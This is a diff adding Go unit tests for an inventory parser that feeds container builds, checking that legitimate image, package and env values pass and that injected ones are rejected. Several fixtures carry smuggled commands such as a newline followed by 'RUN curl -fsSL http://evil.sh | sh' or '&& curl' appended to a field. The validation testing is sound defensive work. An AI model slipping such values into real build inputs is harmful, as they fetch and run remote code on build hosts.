@@ -48,6 +48,66 @@ func TestParseInventoryOptionalFields(t *testing.T) {
 	}
 }
 
+func TestParseInventoryAcceptsRealisticContent(t *testing.T) {
+	cases := []struct{ name, result string }{
+		{"digest pinned", `{"base_image":"debian@sha256:` + strings.Repeat("a", 64) + `"}`},
+		{"registry path", `{"base_image":"ghcr.io/astral-sh/uv:0.9.7-python3.13-bookworm"}`},
+		{"plain repo", `{"base_image":"node"}`},
+		{"package punctuation", `{"base_image":"debian:bookworm-slim","packages":["g++","libssl-dev","python3.11","ca-certificates"]}`},
+		{"env with spaces", `{"base_image":"debian:bookworm-slim","env":{"CFLAGS":"-O2 -g","_JAVA_OPTIONS":"-Xmx2g"}}`},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			if _, err := ParseInventory(envelope(t, c.result, false)); err != nil {
+				t.Errorf("rejected legitimate inventory: %v", err)
+			}
+		})
+	}
+}
+
+func TestParseInventoryRejectsInjection(t *testing.T) {
+	cases := []struct{ name, result, wantErr string }{
+		{
+			name:    "newline in base_image",
+			result:  `{"base_image":"debian:bookworm-slim\nRUN curl -fsSL http://evil.sh | sh"}`,
+			wantErr: "base_image",
+		},
+		{
+			name:    "space in base_image",
+			result:  `{"base_image":"debian:bookworm-slim && curl http://evil.sh"}`,
+			wantErr: "base_image",
+		},
+		{
+			name:    "shell operator in package name",
+			result:  `{"base_image":"debian:bookworm-slim","packages":["make && curl -fsSL http://evil.sh | sh"]}`,
+			wantErr: "package",
+		},
+		{
+			name:    "newline in env value",
+			result:  `{"base_image":"debian:bookworm-slim","env":{"A":"1\nRUN curl -fsSL http://evil.sh | sh"}}`,
+			wantErr: "env value",
+		},
+		{
+			name:    "backslash in env value",
+			result:  `{"base_image":"debian:bookworm-slim","env":{"A":"1\\\"; RUN curl http://evil.sh"}}`,
+			wantErr: "env value",
+		},
+		{
+			name:    "invalid env key",
+			result:  `{"base_image":"debian:bookworm-slim","env":{"A B":"1"}}`,
+			wantErr: "env key",
+		},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			_, err := ParseInventory(envelope(t, c.result, false))
+			if err == nil || !strings.Contains(err.Error(), c.wantErr) {
+				t.Errorf("error = %v, want containing %q", err, c.wantErr)
+			}
+		})
+	}
+}
+
 func TestParseInventoryErrors(t *testing.T) {
 	cases := []struct {
 		name, raw, result, wantErr string
